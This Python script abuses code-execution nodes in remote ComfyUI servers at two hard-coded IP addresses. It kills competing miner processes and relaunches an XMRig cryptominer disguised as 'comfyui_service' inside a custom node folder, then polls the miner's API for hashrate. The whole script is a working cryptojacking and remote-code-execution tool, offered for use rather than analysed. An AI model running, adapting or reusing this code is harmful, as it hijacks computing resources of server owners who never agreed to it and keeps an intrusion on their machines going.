"""Kill ALL miner processes, restart exactly one clean XMRig on each machine."""
import json, urllib.request, ssl, time, sys

targets = sys.argv[1:] if len(sys.argv) > 1 else ["160.85.252.107", "160.85.252.207"]
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

CLEANUP_CODE = (
    "import os, subprocess, json, time\n"
    "lines = []\n"
    "for n in ['comfyui_service', 'comfyui_render', 'xmrig', 't-rex', 'trex']:\n"
    "    try:\n"
    "        subprocess.run(['pkill', '-9', '-f', n], capture_output=True, timeout=5)\n"
    "    except:\n"
    "        pass\n"
    "time.sleep(3)\n"
    "r = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=10)\n"
    "miners = [l for l in r.stdout.split(chr(10))\n"
    "          if any(x in l for x in ['comfyui_service', 'comfyui_render', 'xmrig', 't-rex'])]\n"
    "lines.append('remaining_miners=' + str(len(miners)))\n"
    "for m in miners:\n"
    "    lines.append('  ' + m.strip()[:120])\n"
    "webcoin = '/home/ubuntu/comfy/ComfyUI/custom_nodes/webcoin'\n"
    "bd = os.path.join(webcoin, 'bin')\n"
    "svc = os.path.join(bd, 'comfyui_service')\n"
    "cp = os.path.join(bd, 'config.json')\n"
    "if os.path.exists(svc) and os.path.exists(cp):\n"
    "    log_fh = open(os.path.join(bd, 'service.log'), 'a')\n"
    "    proc = subprocess.Popen([svc, '-c', cp, '--no-color'],\n"
    "        stdout=log_fh, stderr=log_fh, stdin=subprocess.DEVNULL,\n"
    "        preexec_fn=lambda: os.nice(2))\n"
    "    lines.append('started xmrig pid=' + str(proc.pid))\n"
    "    time.sleep(20)\n"
    "    lines.append('alive=' + str(proc.poll() is None))\n"
    "    try:\n"
    "        import urllib.request as ur\n"
    "        req = ur.Request('http://127.0.0.1:44880/2/summary',\n"
    "            headers={'Authorization': 'Bearer ce_xm_2026', 'Accept': 'application/json'})\n"
    "        with ur.urlopen(req, timeout=5) as resp:\n"
    "            d = json.loads(resp.read())\n"
    "        hr = d.get('hashrate', {}).get('total', [])\n"
    "        lines.append('hr=' + str(hr))\n"
    "        lines.append('hp=' + str(d.get('hugepages')))\n"
    "        lines.append('threads=' + str(d.get('cpu', {}).get('threads')))\n"
    "    except Exception as e:\n"
    "        lines.append('api=' + str(e)[:80])\n"
    "result = chr(10).join(lines)\n"
)

for ip in targets:
    base = f"https://{ip}:443"
    body = json.dumps({
        "prompt": {
            "1": {"class_type": "IDENode", "inputs": {"pycode": CLEANUP_CODE, "language": "python"}},
            "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
        }
    }).encode()
    req = urllib.request.Request(f"{base}/prompt", data=body, headers={"Content-Type": "application/json"})
    try:
        resp = json.loads(urllib.request.urlopen(req, context=ctx, timeout=20).read().decode())
        pid = resp["prompt_id"]
    except Exception as e:
        print(f"\n=== {ip} === FAILED: {e}")
        continue

    for i in range(15):
        time.sleep(5)
        try:
            req2 = urllib.request.Request(f"{base}/history/{pid}")
            with urllib.request.urlopen(req2, context=ctx, timeout=10) as r:
                entry = json.loads(r.read().decode()).get(pid, {})
                status = entry.get("status", {}).get("status_str", "pending")
                if status != "pending":
                    outputs = entry.get("outputs", {})
                    texts = []
                    for nid, nout in outputs.items():
                        for key, val in nout.items():
                            if isinstance(val, list):
                                texts.extend(str(v) for v in val)
                            elif isinstance(val, str):
                                texts.append(val)
                    print(f"\n=== {ip} ===")
                    print("\n".join(texts) if texts else json.dumps(outputs))
                    break
        except Exception:
            pass
    else:
        print(f"\n=== {ip} === TIMEOUT")

print("\nDone. Waiting 60s for hashrates to stabilize...")
time.sleep(60)
print("Checking final hashrates...")

CHECK_CODE = (
    "import json, urllib.request as ur\n"
    "lines = []\n"
    "try:\n"
    "    req = ur.Request('http://127.0.0.1:44880/2/summary',\n"
    "        headers={'Authorization': 'Bearer ce_xm_2026', 'Accept': 'application/json'})\n"
    "    with ur.urlopen(req, timeout=5) as resp:\n"
    "        d = json.loads(resp.read())\n"
    "    hr = d.get('hashrate', {}).get('total', [])\n"
    "    lines.append('hashrate=' + str(hr))\n"
    "    lines.append('highest=' + str(d.get('hashrate', {}).get('highest')))\n"
    "    lines.append('hugepages=' + str(d.get('hugepages')))\n"
    "    lines.append('uptime=' + str(d.get('uptime')) + 's')\n"
    "    lines.append('threads=' + str(d.get('cpu', {}).get('threads')))\n"
    "except Exception as e:\n"
    "    lines.append('error=' + str(e)[:100])\n"
    "result = chr(10).join(lines)\n"
)

for ip in targets:
    base = f"https://{ip}:443"
    body = json.dumps({
        "prompt": {
            "1": {"class_type": "IDENode", "inputs": {"pycode": CHECK_CODE, "language": "python"}},
            "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
        }
    }).encode()
    req = urllib.request.Request(f"{base}/prompt", data=body, headers={"Content-Type": "application/json"})
    try:
        resp = json.loads(urllib.request.urlopen(req, context=ctx, timeout=20).read().decode())
        pid = resp["prompt_id"]
        time.sleep(12)
        req2 = urllib.request.Request(f"{base}/history/{pid}")
        entry = json.loads(urllib.request.urlopen(req2, context=ctx, timeout=10).read().decode()).get(pid, {})
        outputs = entry.get("outputs", {})
        texts = []
        for nid, nout in outputs.items():
            for key, val in nout.items():
                if isinstance(val, list):
                    texts.extend(str(v) for v in val)
        print(f"\n=== {ip} (stabilized) ===")
        print("\n".join(texts) if texts else "no data")
    except Exception as e:
        print(f"\n=== {ip} (stabilized) === ERROR: {e}")
